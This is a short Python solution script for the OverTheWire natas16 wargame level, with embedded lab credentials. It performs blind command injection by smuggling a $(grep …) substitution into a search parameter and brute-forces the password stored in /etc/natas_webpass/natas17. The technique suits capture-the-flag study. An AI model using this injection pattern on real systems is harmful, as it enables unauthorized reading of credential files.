import requests

URL = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'
ss = 'bcdghkmnqrswAGHNPQSW035789'
s = requests.Session()
a = ''

for i in range(0,32):
   for ch in ss:
      r = s.get(URL+'?needle=bluffed%24%28grep+'+a+ch+'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search')
      if 'bluffed' in r.text:
         c = 1
      else:
         a = a+ch

print(a)
#i can
